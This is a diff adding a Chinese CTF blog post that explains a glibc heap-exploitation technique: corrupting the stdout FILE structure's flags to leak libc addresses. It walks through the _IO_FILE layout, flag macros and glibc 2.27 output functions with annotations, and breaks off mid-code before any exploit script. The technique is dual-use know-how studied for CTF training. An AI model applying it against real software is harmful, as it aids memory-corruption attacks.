@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="libc泄露 pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言前几天参加了国赛，打完比赛，感觉自己在家半年真的是废了，但是不管怎么说，自己不应该放弃，而是坚持去学。就像教授说的，每个人的成长轨迹都是不一样的，所以，现在回学校之后状态变好就要努力学！ 这个知识点是之前国赛的时候遇到的，就是一般的堆题没有信息泄露，虽然那时候有看过了文件IO的内容了，但是没有见过通过unsorted bin和stdout的低三位区别来爆破，那时候按照了house of ora">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stdout爆破libc">
+<meta property="og:url" content="http://yoursite.com/2020/08/29/stdout%E7%88%86%E7%A0%B4libc/index.html">
+<meta property="og:site_name" content="Tiegu&#39;s Blog">
+<meta property="og:description" content="前言前几天参加了国赛，打完比赛，感觉自己在家半年真的是废了，但是不管怎么说，自己不应该放弃，而是坚持去学。就像教授说的，每个人的成长轨迹都是不一样的，所以，现在回学校之后状态变好就要努力学！ 这个知识点是之前国赛的时候遇到的，就是一般的堆题没有信息泄露，虽然那时候有看过了文件IO的内容了，但是没有见过通过unsorted bin和stdout的低三位区别来爆破，那时候按照了house of ora">
+<meta property="og:image" content="http://yoursite.com/2020/08/29/stdout%E7%88%86%E7%A0%B4libc/1.png">
+<meta property="article:published_time" content="2020-08-29T12:51:54.000Z">
+<meta property="article:modified_time" content="2020-08-29T14:51:50.861Z">
+<meta property="article:author" content="Tiegu Zhu">
+<meta property="article:tag" content="libc泄露 pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/29/stdout%E7%88%86%E7%A0%B4libc/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/08/29/stdout爆破libc/"/>
+
+
+
+
+
+  <title>stdout爆破libc | Tiegu's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tiegu's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">二进制萌新</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/29/stdout%E7%88%86%E7%A0%B4libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tiegu Zhu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/z.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiegu's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">stdout爆破libc</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-29T20:51:54+08:00">
+                2020-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天参加了国赛，打完比赛，感觉自己在家半年真的是废了，但是不管怎么说，自己不应该放弃，而是坚持去学。就像教授说的，每个人的成长轨迹都是不一样的，所以，现在回学校之后状态变好就要努力学！</p>
+<p>这个知识点是之前国赛的时候遇到的，就是一般的堆题没有信息泄露，虽然那时候有看过了文件IO的内容了，但是没有见过通过unsorted bin和stdout的低三位区别来爆破，那时候按照了house of orange的方向，想到了半夜两点，却没有一点头绪。前天打第一届钓鱼城杯，发现又出了这个点，于是就借这个题来学这个点。</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype stdout</span><br><span class="line">type &#x3D; struct _IO_FILE &#123;</span><br><span class="line">    int _flags;</span><br><span class="line">    char *_IO_read_ptr;</span><br><span class="line">    char *_IO_read_end;</span><br><span class="line">    char *_IO_read_base;</span><br><span class="line">    char *_IO_write_base;</span><br><span class="line">    char *_IO_write_ptr;</span><br><span class="line">    char *_IO_write_end;</span><br><span class="line">    char *_IO_buf_base;</span><br><span class="line">    char *_IO_buf_end;</span><br><span class="line">    char *_IO_save_base;</span><br><span class="line">    char *_IO_backup_base;</span><br><span class="line">    char *_IO_save_end;</span><br><span class="line">    struct _IO_marker *_markers;</span><br><span class="line">    struct _IO_FILE *_chain;</span><br><span class="line">    int _fileno;</span><br><span class="line">    int _flags2;</span><br><span class="line">    __off_t _old_offset;</span><br><span class="line">    unsigned short _cur_column;</span><br><span class="line">    signed char _vtable_offset;</span><br><span class="line">    char _shortbuf[1];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    __off64_t _offset;</span><br><span class="line">    struct _IO_codecvt *_codecvt;</span><br><span class="line">    struct _IO_wide_data *_wide_data;</span><br><span class="line">    struct _IO_FILE *_freeres_list;</span><br><span class="line">    void *_freeres_buf;</span><br><span class="line">    size_t __pad5;</span><br><span class="line">    int _mode;</span><br><span class="line">    char _unused2[20];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>
+
+<p>对于一个<code>FILE</code>结构体来说，最重要的元素就是<code>_flags</code>和<code>_fileno</code>，<code>_fileno</code>存储的是我们的文件描述符，对于某些情况或许我们要劫持<code>_fileno</code>才能达到我们的目的，而<code>_flags</code>则标志了该<code>FILE</code>的一些行为，这对于我们的泄露至关重要。</p>
+<h2 id="结构体中的flags"><a href="#结构体中的flags" class="headerlink" title="结构体中的flags"></a>结构体中的flags</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 &#x2F;* Magic number *&#x2F;</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 &#x2F;* Emulate old stdio. *&#x2F;</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 &#x2F;* User owns buffer; don&#39;t delete it on close. *&#x2F;</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 &#x2F;* Reading not allowed *&#x2F;</span><br><span class="line">#define _IO_NO_WRITES 8 &#x2F;* Writing not allowd *&#x2F;</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 &#x2F;* Don&#39;t call close(_fileno) on cleanup. *&#x2F;</span><br><span class="line">#define _IO_LINKED 0x80 &#x2F;* Set if linked (using _chain) to streambuf::_list_all.*&#x2F;</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 &#x2F;* Set if put and get pointer logicly tied. *&#x2F;</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure>
+
+<p><code>_IO_2_1_stdout_</code>一般是这样的，也就是 0xfbad2887：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_MAGIC<span class="params">|_IO_IS_FILEBUF|</span>_IO_CURRENTLY_PUTTING<span class="params">|_IO_LINKED|</span>_IO_NO_READS <span class="params">| _IO_UNBUFFERED |</span>_IO_USER_BUF</span><br></pre></td></tr></table></figure>
+
+<h2 id="put函数执行流程-（了解stdout执行流程）"><a href="#put函数执行流程-（了解stdout执行流程）" class="headerlink" title="put函数执行流程  （了解stdout执行流程）"></a>put函数执行流程  （了解stdout执行流程）</h2><p><strong>代码来自：glibc-2.27/libio/ioputs.c:31</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">&#123;</span><br><span class="line">  int result &#x3D; EOF;</span><br><span class="line">  _IO_size_t len &#x3D; strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  if ((_IO_vtable_offset (_IO_stdout) !&#x3D; 0</span><br><span class="line">       || _IO_fwide (_IO_stdout, -1) &#x3D;&#x3D; -1)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) &#x3D;&#x3D; len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (&#39;\n&#39;, _IO_stdout) !&#x3D; EOF)</span><br><span class="line">    result &#x3D; MIN (INT_MAX, len + 1);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 可以看到这里实际上是调用了_IO_sputn 这个函数，当然这个_IO_sputn实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *s &#x3D; (const char *) data;</span><br><span class="line">  _IO_size_t to_do &#x3D; n;</span><br><span class="line">  int must_flush &#x3D; 0;</span><br><span class="line">  _IO_size_t count &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  if (n &lt;&#x3D; 0)</span><br><span class="line">    return 0;</span><br><span class="line">  &#x2F;* This is an optimized implementation.</span><br><span class="line">     If the amount to be written straddles a block boundary</span><br><span class="line">     (or the filebuf is unbuffered), use sys_write directly. *&#x2F;</span><br><span class="line"></span><br><span class="line">  &#x2F;* First figure out how much space is available in the buffer. *&#x2F;</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count &#x3D; f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      if (count &gt;&#x3D; n)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *p;</span><br><span class="line">      for (p &#x3D; s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          if (*--p &#x3D;&#x3D; &#39;\n&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">          count &#x3D; p - s + 1;</span><br><span class="line">          must_flush &#x3D; 1;</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count &#x3D; f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; &#x2F;* Space available. *&#x2F;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Then fill the buffer. *&#x2F;</span><br><span class="line">  if (count &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (count &gt; to_do)</span><br><span class="line">    count &#x3D; to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr &#x3D; __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s +&#x3D; count;</span><br><span class="line">      to_do -&#x3D; count;</span><br><span class="line">    &#125;</span><br><span class="line">  if (to_do + must_flush &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      &#x2F;* Next flush the (full) buffer. *&#x2F;</span><br><span class="line">      if (_IO_OVERFLOW (f, EOF) &#x3D;&#x3D; EOF)</span><br><span class="line">    &#x2F;* If nothing else has to be written we must not signal the</span><br><span class="line">       caller that everything has been written.  *&#x2F;</span><br><span class="line">    return to_do &#x3D;&#x3D; 0 ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      &#x2F;* Try to maintain alignment: write a whole number of blocks.  *&#x2F;</span><br><span class="line">      block_size &#x3D; f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write &#x3D; to_do - (block_size &gt;&#x3D; 128 ? to_do % block_size : 0);</span><br><span class="line"></span><br><span class="line">      if (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count &#x3D; new_do_write (f, s, do_write);</span><br><span class="line">      to_do -&#x3D; count;</span><br><span class="line">      if (count &lt; do_write)</span><br><span class="line">        return n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      &#x2F;* Now write out the remainder.  Normally, this will fit in the</span><br><span class="line">     buffer, but it&#39;s somewhat messier for line-buffered files,</span><br><span class="line">     so we let _IO_default_xsputn handle the general case. *&#x2F;</span><br><span class="line">      if (to_do)</span><br><span class="line">    to_do -&#x3D; _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  return n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
+
+<p>最终会调用到<code>_IO_OVERFLOW</code>，也就是<code>_IO_new_file_overflow</code>，可以看到这里要求 <code>#define _IO_NO_WRITES 8 /* Writing not allowd */</code>标志位不为1，否则就会返回错误。</p>
+<p>前面先判断了一堆缓冲区还够不够输出之类的，之后调用到了_IO_OVERFLOW，也就是下面的代码。</p>
+<p><strong>代码来自：glibc-2.27/libio/fileops.c:744</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) &#x2F;* SET ERROR *&#x2F;</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |&#x3D; _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  &#x2F;* If currently reading or no buffer allocated. *&#x2F;</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0 || f-&gt;_IO_write_base &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      &#x2F;* Allocate a buffer if needed. *&#x2F;</span><br><span class="line">      if (f-&gt;_IO_write_base &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      &#x2F;* Otherwise must be currently reading.</span><br><span class="line">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span><br><span class="line">     logically slide the buffer forwards one block (by setting the</span><br><span class="line">     read pointers to all point at the beginning of the block).  This</span><br><span class="line">     makes room for subsequent output.</span><br><span class="line">     Otherwise, set the read pointers to _IO_read_end (leaving that</span><br><span class="line">     alone, so it can continue to correspond to the external position). *&#x2F;</span><br><span class="line">      if (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      size_t nbackup &#x3D; f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -&#x3D; MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      if (f-&gt;_IO_read_ptr &#x3D;&#x3D; f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end &#x3D; f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr &#x3D; f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base &#x3D; f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end &#x3D; f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base &#x3D; f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |&#x3D; _IO_CURRENTLY_PUTTING;</span><br><span class="line">      if (f-&gt;_mode &lt;&#x3D; 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end &#x3D; f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  if (ch &#x3D;&#x3D; EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  if (f-&gt;_IO_write_ptr &#x3D;&#x3D; f-&gt;_IO_buf_end ) &#x2F;* Buffer is really full *&#x2F;</span><br><span class="line">    if (_IO_do_flush (f) &#x3D;&#x3D; EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ &#x3D; ch;</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch &#x3D;&#x3D; &#39;\n&#39;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) &#x3D;&#x3D; EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
+
+<h1 id="stdout爆破原理"><a href="#stdout爆破原理" class="headerlink" title="stdout爆破原理"></a>stdout爆破原理</h1><p>从上面可以看到 最终是调用了<code>new_do_write</code>函数来输出我们所需要的东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)   &#x2F;&#x2F; 所以这里要设置 _IO_IS_APPENDING 为1，否则不会有输出</span><br><span class="line">    &#x2F;* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset (before and after) is</span><br><span class="line">       unpredictable. *&#x2F;</span><br><span class="line">    fp-&gt;_offset &#x3D; _IO_pos_BAD;</span><br><span class="line">  else if (fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base)  &#x2F;&#x2F;  或者设置stdout-&gt;_IO_read_end &#x3D;&#x3D; stdout-&gt;_IO_write_base</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    &#x3D; _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">      if (new_pos &#x3D;&#x3D; _IO_pos_BAD)</span><br><span class="line">    return 0;</span><br><span class="line">      fp-&gt;_offset &#x3D; new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count &#x3D; _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column &#x3D; _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, 